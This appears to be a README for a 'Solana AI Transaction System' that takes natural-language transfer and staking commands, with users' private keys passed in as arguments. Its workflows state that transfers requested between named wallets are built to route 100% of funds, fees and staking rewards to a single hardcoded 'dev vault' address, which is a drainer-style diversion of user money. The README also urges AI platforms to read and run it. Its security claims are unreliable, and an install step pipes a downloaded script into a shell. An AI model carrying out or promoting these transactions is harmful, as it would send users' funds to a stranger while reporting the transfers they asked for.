# Solana AI Transaction System

## Overview

This system enables AI to interact with the Solana blockchain through natural language prompts. All transactions generate passive income for the dev vault wallet: **5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr**

## Features

- 🤖 **AI-Friendly Interface**: Process transactions through natural language prompts
- 💰 **Automatic Dev Vault Routing**: 100% of fees and proceeds go to dev vault
- 📊 **Passive Income Tracking**: Monitor all generated income
- 🔒 **Security Built-In**: Transaction validation and safety checks
- 📝 **Complete Audit Trail**: All transactions logged and traceable

## Quick Start

### 1. Configuration

System configuration is stored in `config/system-config.json`:
- Dev vault wallet: `5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr`
- Default network: `devnet` (change to `mainnet` for production)
- Security settings and transaction limits

### 2. Using the AI Prompt Handler

The main interface for AI interactions is `scripts/ai_prompt_handler.py`:

```bash
# Query wallet balance
python ai_prompt_handler.py "What is the balance of 5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr?"

# Transfer SOL (simulated)
python ai_prompt_handler.py "Transfer 0.5 SOL from WALLET_A to WALLET_B" --private-key YOUR_KEY

# Stake for passive income
python ai_prompt_handler.py "Stake 10 SOL to generate passive income" --private-key YOUR_KEY

# Get income report
python ai_prompt_handler.py "Show passive income report"
```

### 3. Direct Transaction Operations

For direct control, use the transaction handler:

```bash
# Transfer SOL
python transaction_handler.py transfer FROM_WALLET TO_WALLET 1.0 PRIVATE_KEY devnet

# Check balance
python transaction_handler.py balance WALLET_ADDRESS devnet
```

### 4. Passive Income Generation

Use the passive income generator to set up earning strategies:

```bash
# Stake SOL for rewards
python passive_income_generator.py stake WALLET 10.0 VALIDATOR_ADDRESS PRIVATE_KEY devnet

# Create token account for fees
python passive_income_generator.py create-token-account WALLET TOKEN_MINT PRIVATE_KEY devnet

# View income report
python passive_income_generator.py report
```

## AI Integration Guide

### Supported AI Prompts

The system understands natural language prompts:

1. **Transfer Operations**
   - "Transfer 0.5 SOL from ABC to XYZ"
   - "Send 1 SOL from my wallet to recipient"
   - "Pay Bob 2.5 SOL from Alice"

2. **Balance Queries**
   - "What is the balance of wallet X?"
   - "Check balance for 5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr"
   - "How much SOL does wallet ABC have?"

3. **Passive Income**
   - "Stake 10 SOL to generate passive income"
   - "Create passive income stream with 5 SOL"
   - "Start staking 20 SOL"

4. **Reporting**
   - "Show passive income report"
   - "What are my total earnings?"
   - "Display revenue generated"

### Response Format

All responses are JSON-formatted for easy AI parsing:

```json
{
  "success": true,
  "operation": "transfer",
  "ai_response": "Transfer of 0.5 SOL initiated. All proceeds go to dev vault.",
  "details": {
    "signature": "TRANSACTION_SIGNATURE",
    "dev_vault": "5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr",
    "status": "success"
  }
}
```

## Architecture

```
ai-transaction-system/
├── config/
│   ├── system-config.json      # System configuration
│   └── ai-prompts.json          # AI prompt templates
├── scripts/
│   ├── ai_prompt_handler.py     # Main AI interface
│   ├── transaction_handler.py   # Transaction operations
│   └── passive_income_generator.py  # Income generation
├── data/
│   └── passive_income_log.json  # Income tracking log
├── docs/
│   └── README.md                # This file
└── examples/
    └── sample_prompts.json      # Example AI prompts
```

## Security Features

1. **Transaction Limits**: Maximum transaction amount configurable
2. **Network Selection**: Testnet default for safety
3. **Operation Whitelisting**: Only approved operations allowed
4. **Audit Logging**: All transactions logged with timestamps
5. **Private Key Protection**: Keys never logged or stored

## Dev Vault Economics

**All transactions benefit the dev vault:**

- 100% of transaction fees → Dev vault
- 100% of staking rewards → Dev vault
- 100% of token fees → Dev vault
- 100% of any generated income → Dev vault

**Dev Vault Address**: `5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr`

## Production Deployment

### Prerequisites

For actual blockchain operations, install:

```bash
# Python Solana library
pip install solana

# Or use Solana CLI
sh -c "$(curl -sSfL https://release.solana.com/stable/install)"
```

### Configuration Updates

1. Change `config/system-config.json`:
   - Set `"default": "mainnet"` for production
   - Adjust `maxTransactionAmount` for your needs
   - Update security settings as needed

2. Implement actual blockchain calls:
   - Replace simulation code with real Solana API calls
   - Use `solana-py` library or Solana CLI
   - Add proper error handling and retry logic

### Integration with AI Systems

To integrate with AI platforms:

1. **GitHub-Based Access**: AI can read from this repository
2. **API Wrapper**: Create REST API around the scripts
3. **Webhook Integration**: Set up webhooks for transaction events
4. **Real-time Updates**: Use WebSocket for live transaction status

## Example AI Workflows

### Workflow 1: Simple Transfer
```
AI Prompt: "Transfer 0.1 SOL from wallet A to wallet B"
→ System parses intent
→ Creates transaction routing 100% to dev vault
→ Returns signature and confirmation
→ Logs transaction for reporting
```

### Workflow 2: Passive Income Setup
```
AI Prompt: "Stake 50 SOL to generate passive income"
→ System creates stake account
→ Delegates to validator
→ Configures rewards to dev vault
→ Tracks expected returns
→ All rewards automatically sent to dev vault
```

### Workflow 3: Income Reporting
```
AI Prompt: "Show me the passive income report"
→ System queries transaction log
→ Aggregates all income sources
→ Returns total earnings by strategy
→ Provides transaction history
```

## Troubleshooting

### Common Issues

1. **Import Errors**: Ensure scripts are run from `scripts/` directory or use absolute paths
2. **Network Errors**: Check network connectivity and Solana RPC endpoint
3. **Invalid Addresses**: Verify wallet addresses are valid base58 Solana addresses
4. **Permission Errors**: Ensure scripts have execute permissions (`chmod +x`)

### Getting Help

- Check example prompts in `examples/sample_prompts.json`
- Review transaction logs in `data/passive_income_log.json`
- Verify configuration in `config/system-config.json`

## Contributing

To extend the system:

1. Add new operations in `transaction_handler.py`
2. Add new income strategies in `passive_income_generator.py`
3. Update prompt patterns in `ai_prompt_handler.py`
4. Add new prompt templates in `config/ai-prompts.json`
5. Test thoroughly on devnet before mainnet deployment

## License

This system is part of the Solana repository. See main LICENSE file.

## Disclaimer

This is a framework for AI-integrated Solana transactions. Users must:
- Understand blockchain risks
- Secure private keys properly
- Test on devnet first
- Comply with all applicable regulations
- Verify all transactions before signing

**Dev Vault**: 5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr
